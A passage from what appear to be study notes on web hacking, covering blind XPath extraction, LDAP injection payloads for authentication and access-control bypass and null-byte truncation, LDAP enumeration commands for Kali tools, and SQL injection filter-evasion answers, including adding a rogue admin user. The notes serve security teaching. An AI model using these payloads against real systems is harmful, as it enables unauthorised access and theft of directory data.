1 or count(parent::*[position()=1])>0
```

These perform the same check but without using string-based injection, which is useful if the application expects numerical values.

**Step 2: Extracting Node Names**

Once confirmed, the next step is extracting the name of the parent node using a character-by-character Boolean test. Example injection:

```
substring(name(parent::*[position()=1]),1,1)='a'
```

**Breakdown:**

- ```name(parent::*[position()=1])``` extracts the name of the first parent node.

- ```substring(...,1,1)``` extracts the first character of that name.

- If this condition returns true, we know the first letter is ```a```; if false, we try ```b```, ```c```, etc. Repeating this process for each character allows us to fully recover the node’s name.

**Step 3: Extracting Node Values**

Once the parent node is identified, we can extract its children using a similar method. Example query:

```
substring(//parentnodename[position()=1]/child::*[position()=1]/text(),1,1)='a'
```

**Breakdown:**

- ```//parentnodename[position()=1]``` selects the first occurrence of ```parentnodename```.

- ```/child::*[position()=1]``` selects its first child node.

- ```/text()``` extracts the text content of that node.

- ```substring(...,1,1)='a'``` checks whether the first character of the node’s value is ```a```. By cycling through possible values (```'a'```, ```'b'```, ```'c'```, etc.), we can extract the entire node content, one character at a time.

To automate this process, two useful XPath functions help streamline the enumeration:

- ```count()``` – Determines the number of child nodes under a given element, so we know how many iterations are needed.

- ```string-length()``` – Finds the length of a node’s value, allowing precise character extraction with ```substring()```.

**Summary of Key Concepts:**

1. XPath injection can be detected using modified SQLi test payloads – If SQLi doesn’t work but similar payloads influence behavior, XPath injection may be present.

2. Boolean-based injection works similarly to SQLi – Logical tests (```or 1=1 and 1=2```) reveal whether input affects queries.

3. Blind extraction is possible character-by-character – Using ```substring()```, ```count()```, and ```name()```, an attacker can reconstruct the entire XML document.

4. XPath structure allows navigation – Parent and child nodes can be enumerated even without prior knowledge of the XML schema.

### Injecting into LDAP:

Lightweight Directory Access Protocol (LDAP) is a protocol used for querying and modifying directory services over a network. A directory is a structured database designed for fast searching rather than complex transactions. While it can store any type of hierarchical data, LDAP is most commonly used to manage **users, credentials, groups, and permissions**—making it a prime target for attackers.

A major example of LDAP usage is Microsoft's Active Directory (AD), which is built on LDAP as its backbone. AD extends LDAP with **Kerberos authentication, Group Policy Objects (GPOs), and domain controller replication**, but at its core, LDAP handles user lookups, authentication, and directory queries. Another popular implementation is OpenLDAP, often found in Linux environments. In short, Active Directory is basically "LDAP on steroids" with Windows-specific enhancements. If you're hacking an enterprise network, you'll inevitably run into LDAP in some form.

LDAP queries use **search filters** to locate entries in the directory. These filters are written using a specific syntax that supports logical operators. Let's look at common query types:

#### Simple Match Conditions:

A simple query retrieves entries based on a single attribute:

```
(username=daf)
```

This searches for an entry where the ```username``` attribute matches ```"daf"```.

#### Disjunctive Queries (OR conditions):

Disjunctive queries use ```|``` (the OR operator) to return entries that match **any** of the specified conditions:

```
(|(cn=searchterm)(sn=searchterm)(ou=searchterm))
```

- ```cn``` = Common Name

- ```sn``` = Surname

- ```ou``` = Organizational Unit

This filter looks for a searchterm in **any** of these attributes. For example, if ```searchterm="Misty"```, LDAP will return users with:

- ```cn=Misty```

- ```sn=Misty```

- ```ou=Misty```

**Note:** LDAP filters must wrap everything inside parentheses, and the ```|``` operator is always the first element inside the main set of parentheses.

#### Conjunctive Queries (AND conditions):

Conjunctive queries use ```&``` (the AND operator) to ensure **all conditions must be simultaneously true** for an entry to be returned:

```
(&(username=daf)(password=secret))
```

This filter searches for an entry where:

- ```username=daf```

- ```password=secret```

This query is a security disaster if a web app directly injects user input into an LDAP authentication query like this—because it leads to LDAP Injection.

#### LDAP Injection:

Just like SQL Injection, LDAP Injection happens when user input is inserted into a query without sanitization. However, exploiting LDAP is different from SQL Injection because:

1. **The logical operators (```&``` and ```|```) are already placed before user input is injected.** This makes it harder to break the query structure like with ```' OR 1=1--``` in SQLi.

2. **The attributes to be returned are often hardcoded.** Unlike SQL, where an attacker might try ```SELECT * FROM users```, in LDAP, the query typically has a fixed attribute set, so dumping everything isn't as easy.

3. **Blind exploitation is often required.** LDAP-based applications usually don’t return detailed errors, so you have to infer vulnerabilities through side-channel behavior (like login success/failure).

#### How to Exploit LDAP Injection:

**Basic Bypass: Null Authentication:**

If the login filter is:

```
(&(username={input})(password={input}))
```

A malicious input like this:

```
(username=*)  
```

could match any username, effectively bypassing authentication.

**Privilege Escalation: Changing Group Membership:**

If the app allows modifying user attributes, an attacker could inject:

```
(&(cn=admin)(member=*))  
```

This might return all users in the admin group, allowing unauthorized access.

**Exfiltrating Data:**

If an application exposes a search function, an attacker could inject:

```
(|(cn=*)(password=*))
```

This attempts to dump all usernames and passwords. Depending on the system, passwords might be stored in plaintext (bad) or hashed (better, but still bad if crackable).

When it comes to poking around LDAP in Kali, we’ve got a few solid tools:

1. ldapsearch (Built into Kali):

- Part of the OpenLDAP suite.

- Lets you query and enumerate LDAP directories.

Example:

```
ldapsearch -x -H ldap://target -D "CN=admin,DC=example,DC=com" -w password -b "DC=example,DC=com"
```

- The ```-x``` flag enforces simple authentication, ```-H``` specifies the LDAP server, ```-D``` is the bind DN (Distinguished Name), and ```-b``` is the base DN to search from.

2. nmap + LDAP scripts:

- ```nmap``` has built-in scripts for LDAP enumeration. Example:

```
nmap -p 389 --script ldap-search target
```

- You can also try ```ldap-rootdse``` to get info about the LDAP server.

3. enum4linux:

More for SMB, but sometimes useful for LDAP enumeration, especially when Active Directory is involved. Example:

```
enum4linux -a target
```

4. CrackMapExec (for AD-focused LDAP fun):

- Great for dumping users, groups, and more from an LDAP directory. Example:

```
cme ldap target -u user -p password --users
```

5. Metasploit:

- Has some LDAP-related modules for enumeration and brute-forcing. Example:

```
use auxiliary/gather/ldap_query
set RHOSTS target
run
```

### More on Exploiting LDAP Injection Vulnerabilities:

Despite the limitations of LDAP injection compared to SQL injection, it is often possible to exploit these vulnerabilities in real-world applications to retrieve unauthorized data or perform unauthorized actions. However, the exact method of exploitation depends on:

- The structure of the LDAP search filter used by the application

- Where user input is injected within the query

- How the back-end LDAP service is implemented

#### Disjunctive Queries and LDAP Injection:

Consider an application that allows users to list employees within a specified department while restricting search results based on geographic locations that the user is authorized to view.

For example, if a user is authorized to view only the ```London``` and ```Reading``` locations, and they search for employees in the Sales department, the application constructs the following LDAP query:

```
(|(department=London sales)(department=Reading sales))
```

Here’s a breakdown:

- ```|``` → The disjunction (OR) operator: at least one condition must be true

- ```(department=London sales)``` → Matches employees in the Sales department at London

- ```(department=Reading sales)``` → Matches employees in the Sales department at Reading

The application **prepends location-based filters** to the user’s input (```sales```) to enforce access control.

An attacker can manipulate the query to list employees from all locations, overriding the application's access control. If the attacker supplies this malicious search term:

```
)(department=*
```

Then, the resulting LDAP query becomes:

```
(|(department=London )(department=*)(department=Reading )(department=*))
```

Here’s why this breaks access control:

1. The injected ```)``` **closes the first filter expression early**, effectively cutting off any restrictions.

2. The wildcard ```*``` matches any department.

3. The application now returns all employees from all locations instead of just the ones the user was supposed to see.

But how did the attacker hnow to use ```department=*```? This is a key question! Attackers typically discover valid field names through:

1. **Error Messages** – If the application leaks hints in error responses.

2. **Source Code or API Documentation** – If LDAP queries or schemas are exposed.

3. **Brute Force / Guessing** – Common LDAP attributes include ```uid```, ```cn```, ```sn```, ```department```, ```ou``` (organizational unit), etc.

4. **Observed Behavior** – If previous queries included terms like ```department=London```, the attacker can infer that ```department``` is a field in use.

#### Conjunctive Queries and LDAP Injection:

Much like disjunctive queries, LDAP injection can also be used to bypass access controls in conjunctive queries—which use the AND (```&```) operator to enforce restrictions.

Consider an application that allows users to search for employees by name, while restricting the results based on geographic location. If a user is only authorized to search within the ```London``` location and searches for an employee named ```daf```, the following LDAP query is performed:

```
(&(givenName=daf)(department=London*))
```

Breakdown:

- ```&``` → The conjunction (AND) operator, meaning both conditions must be true.

- ```(givenName=daf)``` → Matches employees whose first name is "daf".

- ```(department=London*)``` → Ensures results are only from London departments.

This means that even if an attacker tries to modify their ```givenName``` input, they would still be restricted to London-based employees.

An attacker may attempt to subvert this query by injecting malicious input. Some LDAP implementations (e.g., OpenLDAP) **allow multiple search filters to be batched**, treating them as disjunctive (```OR```) queries instead of a single restrictive ```AND``` condition.

An attacker might supply this crafted input:

```
*))(&(givenName=daf
```

This properly **closes the first filter**, then starts a new independent filter that the LDAP service processes separately. In other words, the correct syntax must fully close the first expression before starting a new one.

**Additional Notes:** Where Does That Closing Parenthesis Come From?

The key detail here is how the original query is structured before injection:

```
(&(givenName=USER_INPUT)(department=London*))
```

Now, let's inject the payload into the ```USER_INPUT``` field:

```
(&(givenName=*))(&(givenName=daf)(department=London*)))
```

Look at what happened:

1. The attacker closes the first filter with ```*))```. This ends ```(&(givenName=USER_INPUT)```, making it:

```
(&(givenName=*))
```

which matches all users.

2. The attacker begins a new LDAP filter with ```(&(givenName=daf```. The rest of the query remains unchanged, so LDAP reads it as:

```
(&(givenName=daf)(department=London*))
```

3. The extra closing parenthesis at the end was already part of the original query! Also, the application's query was already structured to close at ```))``` and the attacker only had to provide the missing opening structure to balance it.

So, the attacker isn't adding the last ```)``` manually—it was already there in the original query! That’s why ```*))(&(givenName=daf``` works cleanly without breaking the syntax.

Overall, this results in the following injected query:

```
(&(givenName=*))(&(givenName=daf)(department=London*))
```

**How This Attack Works:**

1. The injected ```*))``` **closes the first filter early**, making it a **valid standalone query**.

2. The added ```(&(givenName=daf``` **starts a new query**.

3. Since **LDAP treats batched filters disjunctively (OR behavior in OpenLDAP)**, the first filter ```(givenName=*)``` matches **everyone in the directory**.

4. The second filter remains ```(givenName=daf)(department=London*)```, but since LDAP processes each independently, the **first filter alone** is enough to return all employees in all locations.

#### Null Byte Injection in LDAP Queries:

Many LDAP implementations are written in low-level languages like C, which handle strings using null-terminated conventions. In these cases, a null byte (```\x00``` or ```%00``` when URL-encoded) signals the end of a string. If a null byte appears in an LDAP search filter, everything after it may be ignored, effectively "commenting out" the remainder of the query. This behavior can be exploited to bypass access controls or manipulate query logic.

Consider a vulnerable LDAP query that retrieves employee names based on user input:

```
(&(givenName=daf)(department=London*))  
```

This conjunctive query ensures that only employees named ```"Daf"``` from London departments are returned.

However, an attacker can exploit null byte handling by injecting the following input:

```
*))%00  
```

Since LDAP ignores everything after the null byte, the effective query reduces to:

```
(&(givenName=*))  
```

This acts as a wildcard search, returning all employees, including those from unauthorized locations.

**Additional Notes:**

- LDAP does not support comments like SQL (```--```) or some programming languages (```#```). However, null bytes can mimic this effect by truncating the query.

- Native LDAP implementations written in C/C++ may treat null bytes as string terminators, causing unexpected query behavior.

- If user input is not properly sanitized, attackers can inject ```%00``` sequences to manipulate search logic and bypass restrictions.

#### Finding LDAP Injection Flaws:

Unlike SQL injection, where an invalid input might return a verbose database error, LDAP injection flaws typically manifest in more subtle ways. Error messages tend to be vague or entirely suppressed, making it trickier to diagnose vulnerabilities. However, you can rely on a few well-defined techniques to test for LDAP injection with reasonable confidence.

1. Using Wildcards to Probe for LDAP Queries:

LDAP uses the ```*``` character as a wildcard, which matches any value in a search filter. This is distinct from SQL, where the equivalent wildcard is ```%``` (for most databases, such as MySQL) or ```_``` (for single-character matching).

- If the application is vulnerable to LDAP injection, submitting ```*``` as a search term may cause it to return an unusually large number of results. This suggests that user input is being directly incorporated into an LDAP query without proper sanitization.

- If you suspect an SQL-based backend instead, try ```%``` instead of ```*``` to see how the system reacts.

2. Breaking Query Syntax with Excessive Parentheses:

Many LDAP queries are constructed using nested filters enclosed within parentheses. By injecting an excessive number of closing parentheses, you might be able to break the query's syntax.

Test Input:

```
))))))))))  
```

- If the application is vulnerable, the injected parentheses could cause an LDAP syntax error, often leading to an HTTP ```500 Internal Server Error``` or an application crash. If no visible error occurs, the application might have implemented basic input validation.

Some applications may strip out excessive or unbalanced parentheses to prevent syntax errors. In such cases, try encoding the input in different ways:

- URL Encoding: ```%29``` (for ```)```)

- Double Encoding: ```%2529```

- Base64 Encoding: (if the application decodes inputs before use)

3. Injecting Filter-Manipulating Queries:

To further verify LDAP injection, you can supply inputs that manipulate the filter logic. The ```cn``` (Common Name) attribute is universally supported across LDAP implementations, making it a good target for testing.

**Example Injection Queries:**

- Subverting the Filter with a Wildcard Match:

```
)(cn=*
```

This injects a new query segment that searches for all ```cn``` attributes, potentially returning a large dataset. If results suddenly include users outside the expected scope, injection is likely.

- Forcing a Disjunctive Query to Bypass Filtering:

```
*))(|(cn=*
```

This attempts to close any existing query structure and injects an ```OR``` condition. If successful, it could return all user records regardless of authorization constraints.

- Null Byte Truncation Attack:

```
*))%00
```

The ```%00``` (null byte) acts as a string terminator in languages like C/C++, potentially cutting off any security filters or access control checks. If results suddenly bypass normal restrictions, the backend likely mishandles null bytes.

By chaining these techniques, you can systematically test for LDAP injection while gathering clues about how input is processed. If you find evidence of a vulnerability, further exploitation might be possible—potentially leading to unauthorized access, privilege escalation, or data exfiltration.

### Questions & Reflections:

1. How can you determine the number of columns returned by a SQL query when performing a UNION-based SQL injection?

- Start with ```ORDER BY``` to incrementally test column count (```ORDER BY 1```, ```ORDER BY 2```, etc.) until an error occurs. Alternatively, try ```UNION SELECT NULL``` and keep adding ```NULL``` values until the query executes successfully.

2. You suspect the database is either MS-SQL or Oracle, but you can't retrieve error messages. How can you confirm the database type?

- Try database-specific functions: ```@@version``` for MS-SQL, ```USER()``` for MySQL, ```SYS_CONTEXT('USERENV', 'DB_NAME')``` for Oracle. Also, different comment styles (```--```, ```/*``` ```*/```, ```;--```) behave differently across databases.

3. Which of the following is the safest place to test a SQL injection attack?

(a) Registering a new user

(b) Updating personal details

(c) Unsubscribing from the service

- (c) Unsubscribing is usually safest. It’s a low-risk action that doesn’t modify critical data or flag your account. Registering might introduce logging risks, and updating details could overwrite valid data.

4. Your ```OR 1=1--``` attack fails because ```--``` is being stripped. How can you bypass input filtering?

- Use alternate inline comments (```#```, ```/* */```), or inject via a different SQL syntax like ```OR 1=1%00``` (null byte) or ```OR 1=1 LIMIT 1```. If ```--``` is blocked but spaces work, use ```/**/```.

5. The application blocks whitespace in input, preventing SQL injection. How can you work around this?

- Use inline comments (```/**/```) instead of spaces (```SELECT/**/1,2/**/FROM/**/users```). Some databases also allow alternative spacing like ```+``` (```SELECT+1,2+FROM+users```).

6. The application doubles single quotes (```'```) in input. How can you inject a string without using quotes?

- Use CHAR encoding (```CHAR(97,100,109,105,110)```) instead of ```'admin'```. MySQL also allows hex encoding (```0x61646D696E```).

7. When can parameterized queries fail to secure an application against SQL injection?

- When the query structure itself is user-controlled, such as when users define column names or table names dynamically. Example: ```SELECT * FROM users ORDER BY ?```. Even with parameterization, injection can occur if attackers manipulate SQL logic at a structural level.

8. You've gained admin access and found SQL injection in user management. How can you leverage it further?

- Create a new admin user (```INSERT INTO users (username, password, role) VALUES ('hacker', 'password', 'admin')```). If you can execute arbitrary SQL, extract password hashes or pivot to OS command execution via stored procedures.

9. How should you rank these vulnerabilities in an application with no sensitive data or authentication?

(a) SQL injection

(b) XPath injection

(c) OS command injection

- (c) OS command injection is the most critical—it can lead to full system compromise. (a) SQL injection is still dangerous (data manipulation, DoS, lateral movement). (b) XPath injection is usually less impactful unless it leads to credential leaks.

10. How can you determine if a personnel search function is querying a relational database or Active Directory?

- Test SQL-specific payloads like ```' OR 1=1 --``` vs. LDAP-specific ones like ```*)(cn=*))```. If wildcards (```*```) or ```(|(attribute=*))``` syntax work, it’s likely LDAP. If ```UNION SELECT``` works, it’s a database.
